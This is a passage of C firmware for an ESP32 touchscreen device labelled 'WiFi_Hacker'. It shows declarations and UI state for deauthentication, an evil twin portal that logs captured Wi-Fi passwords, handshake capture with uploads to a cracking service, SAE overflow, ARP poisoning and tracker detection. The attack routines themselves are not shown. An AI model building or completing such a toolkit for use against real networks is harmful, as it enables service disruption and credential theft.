#include <stdio.h>
#include <time.h>
#include "ff.h"
#include "dexter_img.h"
#include "lvgl.h"

LV_FONT_DECLARE(lv_extra_symbols);
LV_IMG_DECLARE(lab_bg);
LV_IMG_DECLARE(deedee_img);
#define MY_SYMBOL_BLUETOOTH_B     "\xEF\x8A\x94"   /* fa-bluetooth-b    U+F294 */
#define MY_SYMBOL_SEARCH          "\xEF\x8F\xAE"   /* fa-search         U+F3EE */
#define MY_SYMBOL_USB             "\xEF\x8A\x87"   /* fa-usb            U+F287 */
#define MY_SYMBOL_SATELLITE       "\xEF\x9E\xBF"   /* fa-satellite      U+F7BF */
#define MY_SYMBOL_SATELLITE_DISH  "\xEF\x9F\x80"   /* fa-satellite-dish U+F7C0 */
#define MY_SYMBOL_CAR             "\xEF\x86\xB9"   /* fa-car            U+F1B9 */
#define MY_SYMBOL_XRAY            "\xEF\x92\x97"   /* fa-x-ray          U+F497 */
#define MY_SYMBOL_JET_FIGHTER     "\xEE\x94\x98"   /* jet-fighter       U+E518 */
#define MY_SYMBOL_PERSON_WALKING  "\xEE\x95\x93"   /* person-walking    U+E553 */
#include "esp_lcd_panel_io.h"
#include "esp_lcd_panel_vendor.h"
#include "esp_lcd_panel_ops.h"
#include "xpt2046.h"
#include "driver/spi_master.h"
#include "driver/gpio.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/queue.h"
#include "esp_timer.h"
#include "esp_log.h"
#include "esp_heap_caps.h"
#include <string.h>
#include <stdarg.h>
#include <stdint.h>
#include <stdlib.h>
#include <errno.h>
#include "esp_event.h"
#include "freertos/semphr.h"
#include "esp_system.h"
#include "soc/lp_aon_reg.h"
#include "wifi_cli.h"
#include "led_strip.h"
#include "wifi_scanner.h"
#include "wifi_sniffer.h"
#include "wifi_attacks.h"
#include "wifi_wardrive.h"
#include "attack_handshake.h"
#include "frame_analyzer_types.h"
#include "frame_analyzer_parser.h"
#include "pcap_serializer.h"
#include "hccapx_serializer.h"
#include <math.h>
#include <fcntl.h>
#include "lvgl_memory.h"
#include <sys/unistd.h>
#include <sys/reent.h>
#include <dirent.h>
#include <sys/stat.h>
#include "esp_rom_sys.h"
#include "esp_task_wdt.h"
#include "nvs_flash.h"
#include "nvs.h"
#include "esp_http_server.h"

// GPS
#include "driver/uart.h"

// ADC for battery voltage monitoring
#include "esp_adc/adc_oneshot.h"
#include "esp_adc/adc_cali.h"
#include "esp_adc/adc_cali_scheme.h"

// LwIP (ARP Poisoning)
#include "lwip/etharp.h"
#include "lwip/netif.h"
#include "lwip/pbuf.h"
#include "lwip/prot/ethernet.h"
#include "esp_netif.h"
#include "esp_netif_net_stack.h"

// TLS (WPA-SEC upload)
#include "esp_tls.h"

// NimBLE (BLE scanner)
#include "nimble/nimble_port.h"
#include "nimble/nimble_port_freertos.h"
#include "host/ble_hs.h"
// BLE controller TX power API — controller-level, works with NimBLE host
#include "esp_bt.h"
#include "dexter_img.h"
#include "bt_lookout.h"
#include "oui_lookup.h"
#include "gatt_walker.h"

#define TAG "WiFi_Hacker"

// ============================================================================
// Radio Mode Management (WiFi <-> BLE switching)
// ============================================================================
typedef enum {
    RADIO_MODE_NONE,
    RADIO_MODE_WIFI,
    RADIO_MODE_BLE
} radio_mode_t;

static radio_mode_t current_radio_mode = RADIO_MODE_NONE;
static bool wifi_initialized = false;

// ============================================================================
// BLE Scanner state (NimBLE)
// ============================================================================

// Apple Company ID (Little Endian)
#define APPLE_COMPANY_ID        0x004C
// Samsung Company ID (Little Endian)
#define SAMSUNG_COMPANY_ID      0x0075
// Apple Find My Network device type (AirTag, AirPods, etc.)
#define APPLE_FIND_MY_TYPE      0x12

// BLE scan state
static volatile bool bt_scan_active = false;
static TaskHandle_t bt_scan_task_handle = NULL;
static volatile bool nimble_initialized = false;

// BLE device tracking for deduplication
#define BT_MAX_DEVICES 128
static uint8_t bt_found_devices[BT_MAX_DEVICES][6];
static int bt_found_device_count = 0;

// AirTag/SmartTag counters
static int bt_airtag_count = 0;
static int bt_smarttag_count = 0;

// Generic BT device storage for scan_bt command
typedef struct {
    uint8_t addr[6];
    uint8_t addr_type;   /* BLE_ADDR_PUBLIC=0 or BLE_ADDR_RANDOM=1 */
    int8_t rssi;
    char name[32];
    uint16_t company_id;
    bool is_airtag;
    bool is_smarttag;
} bt_device_info_t;

static bt_device_info_t bt_devices[BT_MAX_DEVICES];
static int bt_device_count = 0;

// ============================================================================

// Pin configuration — NM-CYD-C5 (RockBase-iot/NM-CYD-C5, User_Setup-NM-CYD-C5.h)
#define LCD_MOSI 7
#define LCD_MISO 2
#define LCD_CLK  6
#define LCD_CS   23
#define LCD_DC   24
#define LCD_RST  -1   // Tied to board RST/EN — not a GPIO

// XPT2046 resistive touch — SPI shared bus (T_IRQ not connected, polling only)
#define TOUCH_CS  1

// Backlight GPIO (HIGH = on; GPIO 25 is strapping pin but safe after boot)
#define LCD_BL_IO 25
#define LCD_BL_ACTIVE_LEVEL 1
#define BOOT_BTN_GPIO        28   // NM-CYD-C5 BOOT button = IO28 (strapping pin, input-safe)
#define GO_DARK_DBL_CLICK_MS 800

// NOTE: No battery ADC on NM-CYD-C5 — GPIO6 is SPI SCK, not battery monitor.

#define SCREEN_INACTIVITY_TIMEOUT_MS 30000
#define SCREEN_INACTIVITY_CHECK_MS 1000
#define SCREEN_BACKLIGHT_ACTIVE_PERCENT 80
#define SCREEN_BACKLIGHT_DIM_PERCENT 0

#define LCD_H_RES 240
#define LCD_V_RES 320
#define LCD_HOST SPI2_HOST

// Battery ADC configuration - Waveshare ESP32-C5-WIFI6-KIT (DISABLED - using regular C5 chip)
// Schematic: R10=200k, R16=100k voltage divider on BAT_ADC line
// Note: GPIO6 = ADC1_CH5 on ESP32-C5 (not CH6!)
#define BATTERY_ADC_CHANNEL    ADC_CHANNEL_5  // GPIO6 = ADC1_CH5 (BAT_ADC on Waveshare)
#define BATTERY_ADC_UNIT       ADC_UNIT_1
#define BATTERY_ADC_ATTEN      ADC_ATTEN_DB_12  // Full scale ~3.3V
#define BATTERY_VOLTAGE_DIVIDER_RATIO  3.2f    // Calibrated: VBAT 4.14V / GPIO6 1.29V = 3.21
#define BATTERY_ADC_SAMPLES            32      // Number of samples to average
#define BATTERY_UPDATE_INTERVAL_MS     30000   // 30 seconds

// Battery voltage thresholds
#define BATTERY_VOLTAGE_CRITICAL  2.0f   // Below this: no battery symbol
#define BATTERY_VOLTAGE_CHARGING  4.8f   // Above this: charging (lightning symbol)

// ============================================================================
// Dark / Light dual palette (LAB5 theme)
// ============================================================================
#define COLOR_DARK_BG            lv_color_hex(0x050A14)
#define COLOR_DARK_PANEL         lv_color_hex(0x091423)
#define COLOR_DARK_CARD          lv_color_hex(0x0C1A2A)
#define COLOR_DARK_CARD_PRESSED  lv_color_hex(0x132338)
#define COLOR_DARK_BORDER        lv_color_hex(0x273D57)
#define COLOR_DARK_TEXT          lv_color_hex(0xEAF3FF)
#define COLOR_DARK_MUTED         lv_color_hex(0x93A6BC)
#define COLOR_DARK_ACCENT        lv_color_hex(0x52B6FF)

#define COLOR_LIGHT_BG            lv_color_hex(0xE8EEF5)
#define COLOR_LIGHT_PANEL         lv_color_hex(0xDCE6F1)
#define COLOR_LIGHT_CARD          lv_color_hex(0xF8FBFF)
#define COLOR_LIGHT_CARD_PRESSED  lv_color_hex(0xEAF1F8)
#define COLOR_LIGHT_BORDER        lv_color_hex(0xA6B6C8)
#define COLOR_LIGHT_TEXT          lv_color_hex(0x1E2A36)
#define COLOR_LIGHT_MUTED         lv_color_hex(0x5C6D80)
#define COLOR_LIGHT_ACCENT        lv_color_hex(0x365E87)

// Fixed accent colors (theme-independent, used for icon tints and status)
#define UI_ACCENT_BLUE       lv_color_hex(0x2196F3)
#define UI_ACCENT_RED        lv_color_hex(0xF44336)
#define UI_ACCENT_ORANGE     lv_color_hex(0xFF9800)
#define UI_ACCENT_PURPLE     lv_color_hex(0x9C27B0)
#define UI_ACCENT_CYAN       lv_color_hex(0x00BCD4)
#define UI_ACCENT_GREEN      lv_color_hex(0x4CAF50)
#define UI_ACCENT_PINK       lv_color_hex(0xE91E63)
#define UI_ACCENT_TEAL       lv_color_hex(0x009688)
#define UI_ACCENT_AMBER      lv_color_hex(0xFFC107)
#define UI_ACCENT_INDIGO     lv_color_hex(0x3F51B5)
#define COLOR_MAGENTA        lv_color_hex(0xFF2FA3)

// Backward-compat aliases (used by attack status colors throughout the file)
#define COLOR_MATERIAL_BLUE     UI_ACCENT_BLUE
#define COLOR_TILE_BLUE         UI_ACCENT_BLUE
#define COLOR_MATERIAL_RED      UI_ACCENT_RED
#define COLOR_MATERIAL_GREEN    UI_ACCENT_GREEN
#define COLOR_MATERIAL_INDIGO   UI_ACCENT_INDIGO
#define COLOR_MATERIAL_TEAL     UI_ACCENT_TEAL
#define COLOR_MATERIAL_PINK     UI_ACCENT_PINK
#define COLOR_MATERIAL_ORANGE   UI_ACCENT_ORANGE
#define COLOR_MATERIAL_AMBER    UI_ACCENT_AMBER
#define COLOR_MATERIAL_PURPLE   UI_ACCENT_PURPLE
#define COLOR_MATERIAL_CYAN     UI_ACCENT_CYAN
#define COLOR_DARK_BLUE         lv_color_hex(0x0F3C64)
#define COLOR_LABEL_DEFAULT     lv_color_white()

static bool dark_mode_enabled = true;

static inline lv_color_t ui_bg_color(void) {
    return dark_mode_enabled ? COLOR_DARK_BG : COLOR_LIGHT_BG;
}
static inline lv_color_t ui_panel_color(void) {
    return dark_mode_enabled ? COLOR_DARK_PANEL : COLOR_LIGHT_PANEL;
}
static inline lv_color_t ui_card_color(void) {
    return dark_mode_enabled ? COLOR_DARK_CARD : COLOR_LIGHT_CARD;
}
static inline lv_color_t ui_card_pressed_color(void) {
    return dark_mode_enabled ? COLOR_DARK_CARD_PRESSED : COLOR_LIGHT_CARD_PRESSED;
}
static inline lv_color_t ui_border_color(void) {
    return dark_mode_enabled ? COLOR_DARK_BORDER : COLOR_LIGHT_BORDER;
}
static inline lv_color_t ui_text_color(void) {
    return dark_mode_enabled ? COLOR_DARK_TEXT : COLOR_LIGHT_TEXT;
}
static inline lv_color_t ui_muted_color(void) {
    return dark_mode_enabled ? COLOR_DARK_MUTED : COLOR_LIGHT_MUTED;
}
static inline lv_color_t ui_accent_color(void) {
    return dark_mode_enabled ? COLOR_DARK_ACCENT : COLOR_LIGHT_ACCENT;
}

// WPA-SEC upload constants
#define WPASEC_URL           "https://wpa-sec.stanev.org/"
#define WPASEC_KEY_PATH      "/sdcard/lab/wpa-sec.txt"
#define WPASEC_KEY_MAX_LEN   65

typedef int (*vprintf_like_t)(const char *, va_list);

static lv_disp_draw_buf_t draw_buf;
static lv_color_t *buf1 = NULL;
static lv_color_t *buf2 = NULL;
static SemaphoreHandle_t lvgl_mutex = NULL;
SemaphoreHandle_t sd_spi_mutex = NULL;  // Mutex for SD/SPI access (shared with display) - used by attack_handshake.c
static SemaphoreHandle_t flush_done_sem = NULL;  // Binary semaphore: ISR signals DMA done, task calls lv_disp_flush_ready
static volatile bool touch_pressed_flag = false;
static volatile uint16_t touch_x_flag = 0;
static volatile uint16_t touch_y_flag = 0;
static volatile bool show_touch_dot = true;
static volatile bool ui_locked = false;
static volatile bool nav_to_menu_flag = false;
static volatile int64_t last_input_ms = 0;
static volatile bool screen_dimmed = false;
static volatile bool ignore_touch_until_release = false;
static lv_timer_t *screen_idle_timer = NULL;
static volatile bool go_dark_active          = false;
static bool          boot_btn_prev_pressed   = false; // true = was pressed last poll
static uint8_t       boot_btn_click_count    = 0;
static uint32_t      boot_btn_last_release_ms = 0;   // timestamp of most recent release
static uint32_t      boot_btn_hold_start_ms  = 0;    // timestamp when hold began

// Screen settings (loaded from NVS)
static int32_t screen_timeout_ms = 0;       // 0 = stays on (default)
static uint8_t screen_brightness_pct = 80;  // 10-100% (default 80)
static lv_obj_t *brightness_overlay = NULL; // Software brightness overlay on lv_layer_top()
static uint16_t scan_time_min_ms = 100;     // Active scan min time per channel (default 100)
static uint16_t scan_time_max_ms = 300;     // Active scan max time per channel (default 300)
static uint32_t g_gatt_timeout_ms = 30000; // GATT connect timeout (NVS-persisted)
static char     g_saved_wifi_ssid[33] = ""; // Home network SSID for file server STA mode
static char     g_saved_wifi_pass[65] = ""; // Home network password

// NVS settings keys
#define NVS_NAMESPACE       "settings"
#define NVS_KEY_TIMEOUT     "scr_timeout"
#define NVS_KEY_BRIGHTNESS  "scr_bright"
#define NVS_KEY_SCAN_MIN    "scan_min"
#define NVS_KEY_SCAN_MAX    "scan_max"
#define NVS_KEY_DARK_MODE    "dark_mode"
#define NVS_KEY_POWER_MODE   "pwr_mode"
#define NVS_KEY_GATT_TIMEOUT "gatt_tmo"
#define NVS_KEY_WIFI_SSID    "wifi_ssid"
#define NVS_KEY_WIFI_PASS    "wifi_pass"

// Touch calibration NVS
#define TOUCH_CAL_NVS_NS      "touch_cal"
#define TOUCH_CAL_MAGIC       ((uint16_t)0xCA11)
#define TOUCH_CAL_NULL_RADIUS 250   // raw ADC units — reject within this radius of null point

typedef struct {
    int32_t  x_min, x_max;
    int32_t  y_min, y_max;
    int32_t  null_x, null_y;
    uint8_t  invert_x, invert_y, swap_xy;
} touch_cal_t;

static bool touch_cal_loaded = false;
static bool touch_cal_needed = false;

// ============================================================================
// Theme-aware style helpers
// ============================================================================

static void style_surface_panel(lv_obj_t *obj, lv_coord_t radius) {
    if (!obj) return;
    lv_obj_set_style_bg_color(obj, ui_panel_color(), 0);
    lv_obj_set_style_border_width(obj, 1, 0);
    lv_obj_set_style_border_color(obj, ui_border_color(), 0);
    lv_obj_set_style_border_opa(obj, dark_mode_enabled ? LV_OPA_40 : LV_OPA_80, 0);
    lv_obj_set_style_radius(obj, radius, 0);
}

static void style_popup_card(lv_obj_t *popup, lv_coord_t radius, lv_color_t accent) {
    if (!popup) return;
    style_surface_panel(popup, radius);
    lv_obj_set_style_border_color(popup, accent, 0);
    lv_obj_set_style_border_opa(popup, dark_mode_enabled ? LV_OPA_70 : LV_OPA_90, 0);
    lv_obj_set_style_shadow_width(popup, dark_mode_enabled ? 20 : 10, 0);
    lv_obj_set_style_shadow_color(popup, lv_color_hex(0x000000), 0);
    lv_obj_set_style_shadow_opa(popup, dark_mode_enabled ? LV_OPA_30 : LV_OPA_20, 0);
}

static void style_modal_overlay(lv_obj_t *overlay, lv_opa_t opacity) {
    if (!overlay) return;
    lv_obj_remove_style_all(overlay);
    lv_obj_set_size(overlay, lv_pct(100), lv_pct(100));
    lv_obj_set_style_bg_color(overlay, lv_color_hex(0x000000), 0);
    lv_obj_set_style_bg_opa(overlay, opacity, 0);
    lv_obj_clear_flag(overlay, LV_OBJ_FLAG_SCROLLABLE);
    lv_obj_add_flag(overlay, LV_OBJ_FLAG_CLICKABLE);
}

static void style_neutral_button(lv_obj_t *btn) {
    if (!btn) return;
    lv_obj_set_style_bg_color(btn,
        dark_mode_enabled ? lv_color_hex(0x13263C) : lv_color_hex(0xD4DFEA), 0);
    lv_obj_set_style_bg_color(btn,
        dark_mode_enabled ? lv_color_hex(0x1E3550) : lv_color_hex(0xC3D1E1),
        LV_STATE_PRESSED);
    lv_obj_set_style_border_width(btn, 1, 0);
    lv_obj_set_style_border_color(btn, ui_border_color(), 0);
    lv_obj_set_style_border_opa(btn, dark_mode_enabled ? LV_OPA_70 : LV_OPA_100, 0);
    lv_obj_set_style_radius(btn, 8, 0);
}

static esp_lcd_panel_handle_t panel_handle;
static esp_lcd_panel_io_handle_t lcd_io_handle;
static xpt2046_handle_t touch_handle;
static lv_obj_t *touch_dot;  // DEBUG: visual touch indicator
static lv_obj_t *title_bar;
static lv_obj_t *function_page = NULL;
static lv_obj_t *screenshot_btn = NULL;
static lv_obj_t *main_screenshot_btn = NULL;  // Screenshot button on main screen
static QueueHandle_t screenshot_queue = NULL;
static TaskHandle_t screenshot_task_handle = NULL;
static StaticTask_t screenshot_task_buffer;
static StackType_t *screenshot_task_stack = NULL;
static volatile bool screenshot_in_progress = false;

#define SCREENSHOT_DIR "/sdcard/screenshots"

typedef struct {
    lv_img_dsc_t *shot;
} screenshot_msg_t;

// Use GPS definitions from wifi_common.h via wifi_cli.h
static gps_data_t current_gps = {0};
static char gps_rx_buffer[GPS_BUF_SIZE];
static StaticTask_t gps_task_buffer;
static StackType_t *gps_task_stack = NULL;

// SD init task buffers
static StaticTask_t sd_init_task_buffer;
static StackType_t *sd_init_task_stack = NULL;

static esp_err_t init_gps_uart(void);
static bool parse_gps_nmea(const char *nmea_sentence);
static void gps_task(void *arg);
static void screenshot_btn_event_cb(lv_event_t *e);

// Battery voltage monitor forward declarations (DISABLED - using regular C5 chip)
static esp_err_t init_battery_adc(void);
static float read_battery_voltage(void);
static void battery_monitor_task(void *arg);
static esp_err_t save_snapshot_bmp(lv_img_dsc_t *shot, const char *filepath);
static int find_next_screenshot_index(void);
static esp_err_t ensure_screenshot_dir(void);

static void init_backlight(void);
static void set_backlight_percent(uint8_t percent);
static void screen_set_dimmed(bool dimmed);
static void screen_idle_timer_cb(lv_timer_t *timer);
static void go_dark_enable(void);
static void go_dark_disable(void);
static void init_boot_button(void);

// Route ESP logging directly to ROM UART to avoid VFS write paths during GUI/ISR contexts
static int rom_vprintf(const char *fmt, va_list ap)
{
	char buf[256];
	int len = vsnprintf(buf, sizeof(buf), fmt, ap);
	if (len > 0) {
		if (len < (int)sizeof(buf)) {
			esp_rom_printf("%s", buf);
		} else {
			// Truncate safely to avoid heap/VFS usage
			esp_rom_printf("%.*s", (int)sizeof(buf) - 1, buf);
		}
	}
	return len;
}

// Scanner UI state
static volatile bool scan_done_ui_flag = false;
#define SCAN_RESULTS_MAX_DISPLAY 32

// Whitelist for BSSID protection
#define MAX_WHITELISTED_BSSIDS 150
typedef struct {
    uint8_t bssid[6];
} whitelisted_bssid_t;
whitelisted_bssid_t whiteListedBssids[MAX_WHITELISTED_BSSIDS];
int whitelistedBssidsCount = 0;

// ============================================================================
// SD Card Cache in PSRAM
// ============================================================================
#define SD_CACHE_INITIAL_CAPACITY 50
#define SD_CACHE_MAX_ENTRY_LEN 512
#define SD_CACHE_MAX_FILENAME_LEN 64
#define SD_CACHE_MAX_HTML_FILES 32
#define SD_CACHE_MAX_HANDSHAKES 100

typedef struct {
    // Evil Twin passwords (eviltwin.txt)
    char **eviltwin_entries;  // Array of strings "SSID", "password"
    int eviltwin_count;
    int eviltwin_capacity;
    
    // Portal data (portals.txt)
    char **portals_entries;   // Array of strings (full lines)
    int portals_count;
    int portals_capacity;
    
    // HTML filenames from /sdcard/lab/htmls/ (content loaded on-demand)
    char **html_filenames;  // Array of filenames only (no content)
    int html_count;
    
    // Handshake filenames from /sdcard/lab/handshakes/
    char **handshake_names;  // Array of .pcap filenames
    int handshake_count;
    
    // WPA-SEC API key from wpa-sec.txt
    char wpasec_key[WPASEC_KEY_MAX_LEN];
    
    bool loaded;  // True when all data is loaded
} sd_cache_t;

static sd_cache_t *sd_cache = NULL;  // Allocated in PSRAM

// SD loading popup
static lv_obj_t *sd_loading_popup = NULL;
static lv_obj_t *sd_loading_label = NULL;

// Forward declarations for SD cache functions
static esp_err_t sd_cache_init(void);
static esp_err_t sd_cache_load_all(void);
void sd_cache_add_eviltwin_entry(const char *entry);
void sd_cache_add_portal_entry(const char *entry);
void sd_cache_add_handshake_name(const char *name);

static lv_obj_t *scan_status_label = NULL;
static lv_obj_t *scan_list = NULL;
static lv_obj_t *deauth_list = NULL;
static lv_obj_t *deauth_prompt_label = NULL;
static lv_obj_t *deauth_fps_label = NULL;
static lv_obj_t *deauth_pause_btn = NULL;
static lv_obj_t *deauth_quit_btn = NULL;
static volatile bool deauth_stop_flag = false;
static volatile bool deauth_resume_flag = false;
static volatile bool deauth_paused = false;
static volatile uint32_t lvgl_flush_counter = 0;

// Deauth rescan feature - periodic channel verification
static volatile bool deauth_rescan_pending = false;
static volatile bool deauth_rescan_active = false;
static volatile bool deauth_rescan_done_flag = false;  // Separate flag for rescan completion
static esp_timer_handle_t deauth_rescan_timer = NULL;
#define DEAUTH_RESCAN_INTERVAL_MS 180000  // 3 minutes
static uint8_t deauth_target_bssids[MAX_SCAN_RESULTS][6];
static uint8_t deauth_target_channels[MAX_SCAN_RESULTS];
static int deauth_target_count = 0;

// Targeted station deauth (single client)
static uint8_t targeted_deauth_station_mac[6];
static uint8_t targeted_deauth_ap_bssid[6];
static char targeted_deauth_ssid[33];
static uint8_t targeted_deauth_channel;
static int targeted_deauth_ap_index = -1;  // AP index to return to after stop
static volatile bool targeted_deauth_active = false;
static lv_obj_t *targeted_deauth_status_label = NULL;
static lv_timer_t *targeted_deauth_timer = NULL;
static uint32_t targeted_deauth_count = 0;

static lv_obj_t *evil_twin_network_dd = NULL;
static lv_obj_t *evil_twin_html_dd = NULL;
static lv_obj_t *evil_twin_start_btn = NULL;
static lv_obj_t *evil_twin_status_label = NULL;
static lv_obj_t *evil_twin_log_ta = NULL;
static lv_obj_t *evil_twin_content = NULL;
static int evil_twin_network_map[SCAN_RESULTS_MAX_DISPLAY];
static int evil_twin_network_count = 0;
static int evil_twin_html_map[SCAN_RESULTS_MAX_DISPLAY];
static int evil_twin_html_count = 0;

// Evil Twin new UI elements
static lv_obj_t *evil_twin_ssid_label = NULL;
static lv_obj_t *evil_twin_deauth_list_label = NULL;
static lv_obj_t *evil_twin_status_list = NULL;
static char evil_twin_current_ssid[33] = "";

typedef struct {
    char text[160];
} evil_log_msg_t;

// Evil Twin event queue for UI updates
static QueueHandle_t evil_twin_event_queue = NULL;

static QueueHandle_t evil_twin_log_queue = NULL;
static bool evil_twin_log_capture_enabled = false;
static vprintf_like_t previous_vprintf = NULL;

// Blackout UI state
static lv_obj_t *blackout_networks_label = NULL;
static lv_obj_t *blackout_status_label = NULL;
static lv_obj_t *blackout_stop_btn = NULL;
static QueueHandle_t blackout_log_queue = NULL;
static bool blackout_log_capture_enabled = false;
static volatile bool blackout_ui_active = false;

// Snifferdog UI state
static lv_obj_t *snifferdog_kick_label = NULL;
static lv_obj_t *snifferdog_recent_label = NULL;
static lv_obj_t *snifferdog_stop_btn = NULL;
static QueueHandle_t snifferdog_log_queue = NULL;
static bool snifferdog_log_capture_enabled = false;
static volatile bool snifferdog_ui_active = false;

// Snifferdog attack state (from original project)
static TaskHandle_t sniffer_dog_task_handle = NULL;
static StaticTask_t sniffer_dog_task_buffer;
static StackType_t *sniffer_dog_task_stack = NULL;
static volatile bool sniffer_dog_active = false;
static int sniffer_dog_current_channel = 1;
static int sniffer_dog_channel_index = 0;
static int64_t sniffer_dog_last_channel_hop = 0;
static const int sniffer_channel_hop_delay_ms = 250;
static volatile uint32_t snifferdog_kick_count = 0;
static char snifferdog_last_pair[48] = "N/A";
static portMUX_TYPE snifferdog_stats_spin = portMUX_INITIALIZER_UNLOCKED;

// Sniffer UI state
static lv_obj_t *sniffer_log_ta = NULL;
static lv_obj_t *sniffer_stop_btn = NULL;
static lv_obj_t *sniffer_start_btn = NULL;
static lv_obj_t *sniffer_packets_label = NULL;
static lv_obj_t *sniffer_aps_label = NULL;
static lv_obj_t *sniffer_probes_label = NULL;
static QueueHandle_t sniffer_log_queue = NULL;

// New sniffer UI elements
static lv_obj_t *sniffer_channel_label = NULL;
static lv_obj_t *sniffer_ap_list = NULL;
static lv_obj_t *sniffer_observe_client_list = NULL;  // Client list in observation view
static volatile bool sniffer_observe_mode = false;
static int sniffer_observe_ap_index = -1;
static volatile bool sniffer_ui_needs_refresh = false;
static bool sniffer_log_capture_enabled = false;
static volatile bool sniffer_ui_active = false;
static bool sniffer_return_pending = false;  // Track if we should return to sniffer from sub-pages

// Sniffer list stable sort order (only sort once, then keep order stable)
static int *sniffer_sorted_indices = NULL;  // PSRAM allocated
static int sniffer_sorted_count = 0;        // How many entries in sorted array
static bool sniffer_initial_sort_done = false;
static uint32_t sniffer_start_time = 0;     // Time when sniffer started (for delayed sorting)
static uint32_t sniffer_last_sort_time = 0;  // Time of last RSSI re-sort

// Sniffer task state
static TaskHandle_t sniffer_task_handle = NULL;
static StaticTask_t sniffer_task_buffer;
static StackType_t *sniffer_task_stack = NULL;
static volatile bool sniffer_task_active = false;

// SAE Overflow UI state
static lv_obj_t *sae_overflow_log_ta = NULL;
static lv_obj_t *sae_overflow_stop_btn = NULL;
static QueueHandle_t sae_overflow_log_queue = NULL;
static bool sae_overflow_log_capture_enabled = false;
static volatile bool sae_overflow_ui_active = false;

// Handshake UI state
static lv_obj_t *handshake_log_ta = NULL;
static lv_obj_t *handshake_stop_btn = NULL;
static lv_obj_t *handshake_status_list = NULL;
static QueueHandle_t handshake_log_queue = NULL;
static bool handshake_log_capture_enabled = false;
static volatile bool handshake_ui_active = false;

// Handshake UI dashboard labels (for sniffer mode)
static lv_obj_t *hs_ui_channel_label = NULL;
static lv_obj_t *hs_ui_target_label = NULL;
static lv_obj_t *hs_ui_beacon_label = NULL;
static lv_obj_t *hs_ui_m1_label = NULL;
static lv_obj_t *hs_ui_m2_label = NULL;
static lv_obj_t *hs_ui_m3_label = NULL;
static lv_obj_t *hs_ui_m4_label = NULL;
static lv_obj_t *hs_ui_stats_label = NULL;
static lv_obj_t *hs_ui_status_label = NULL;
static lv_timer_t *hs_ui_timer = NULL;
static volatile bool hs_ui_update_flag = false;

// Handshake attack state
static TaskHandle_t handshake_attack_task_handle = NULL;
static StaticTask_t handshake_attack_task_buffer;
static StackType_t *handshake_attack_task_stack = NULL;
static volatile bool handshake_attack_active = false;
static volatile bool handshake_waiting_for_scan = false;
static volatile bool g_handshaker_global_mode = false;
static bool handshake_selected_mode = false;
static wifi_ap_record_t handshake_targets[MAX_AP_CNT];
static int handshake_target_count = 0;
static bool handshake_captured[MAX_AP_CNT];
static int handshake_current_index = 0;

// ============================================================================
// Sniffer-based Handshake Attack with D-UCB Channel Selection
// ============================================================================

#define HS_MAX_APS      64
#define HS_MAX_CLIENTS  128
#define DUCB_GAMMA      0.99
#define DUCB_C          1.0
#define HS_DEAUTH_COOLDOWN_US  (3 * 1000000LL)
#define HS_DWELL_TIME_MS       400
#define HS_STATS_INTERVAL_US   (30 * 1000000LL)
#define HS_AP_STALE_US         (30 * 1000000LL)

typedef struct {
    int channel;
    double discounted_reward;
    double discounted_pulls;
    int total_pulls;
} ducb_channel_t;

typedef struct {
    uint8_t bssid[6];
    char ssid[33];
    uint8_t channel;
    wifi_auth_mode_t authmode;
    int rssi;
    bool captured_m1, captured_m2, captured_m3, captured_m4;
    bool complete;
    bool beacon_captured;
    bool has_existing_file;
    int64_t last_deauth_us;
    int64_t last_seen_us;
    int target_index;
} hs_ap_target_t;

typedef struct {
    uint8_t mac[6];
    int hs_ap_index;
    int rssi;
    int64_t last_seen_us;
    int64_t last_deauth_us;
    bool deauthed;
} hs_client_entry_t;

static const int dual_band_channels[] = {
    1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14,
    36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128,
    132, 136, 140, 144, 149, 153, 157, 161, 165
};
static const int dual_band_channels_count = sizeof(dual_band_channels) / sizeof(dual_band_channels[0]);

static hs_ap_target_t *hs_ap_targets = NULL;
static int hs_ap_count = 0;
static hs_client_entry_t *hs_clients = NULL;
static int hs_client_count = 0;
static ducb_channel_t *ducb_channels = NULL;
static int ducb_channel_count = 0;
static double ducb_discounted_total = 0.0;

static volatile int hs_dwell_new_clients = 0;
static volatile int hs_dwell_eapol_frames = 0;

// Shared volatile state for UI updates
static volatile int hs_current_channel = 0;
static char hs_current_target_ssid[33] = "";
static char hs_current_client_mac[20] = "";
static volatile bool hs_listening_after_deauth = false;
static volatile int hs_total_handshakes_captured = 0;

// ============================================================================
// Wardrive Promisc: Kismet-style tiered channel lists + D-UCB
// ============================================================================

static const uint8_t wdp_ch_24_primary[]   = {1, 6, 11};
static const uint8_t wdp_ch_24_secondary[] = {2, 3, 4, 5, 7, 8, 9, 10, 12, 13};
static const uint8_t wdp_ch_5_non_dfs[]    = {36, 40, 44, 48, 149, 153, 157, 161, 165};
static const uint8_t wdp_ch_5_dfs[]        = {52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 144, 169, 173, 177};

#define WDP_CH_24_PRIMARY_COUNT   (sizeof(wdp_ch_24_primary) / sizeof(wdp_ch_24_primary[0]))
#define WDP_CH_24_SECONDARY_COUNT (sizeof(wdp_ch_24_secondary) / sizeof(wdp_ch_24_secondary[0]))
#define WDP_CH_5_NON_DFS_COUNT    (sizeof(wdp_ch_5_non_dfs) / sizeof(wdp_ch_5_non_dfs[0]))
#define WDP_CH_5_DFS_COUNT        (sizeof(wdp_ch_5_dfs) / sizeof(wdp_ch_5_dfs[0]))
#define WDP_TOTAL_CHANNELS        (WDP_CH_24_PRIMARY_COUNT + WDP_CH_24_SECONDARY_COUNT + WDP_CH_5_NON_DFS_COUNT + WDP_CH_5_DFS_COUNT)

#define WDP_DUCB_GAMMA            0.99
#define WDP_DUCB_C                1.0
#define WDP_DWELL_PRIMARY_MS      500
#define WDP_DWELL_DEFAULT_MS      400
#define WDP_DWELL_DFS_MS          250
#define WDP_INITIAL_CAPACITY      256
#define WDP_PSRAM_RESERVE_BYTES   (64 * 1024)
#define WDP_STATS_INTERVAL_US     (30 * 1000000LL)
#define WDP_FILE_FLUSH_INTERVAL   50

typedef enum {
    WDP_TIER_24_PRIMARY,
    WDP_TIER_24_SECONDARY,
    WDP_TIER_5_NON_DFS,
    WDP_TIER_5_DFS,
} wdp_channel_tier_t;

typedef struct {
    int channel;
    wdp_channel_tier_t tier;
    double discounted_reward;
    double discounted_pulls;
    int total_pulls;
} wdp_ducb_channel_t;

typedef struct {
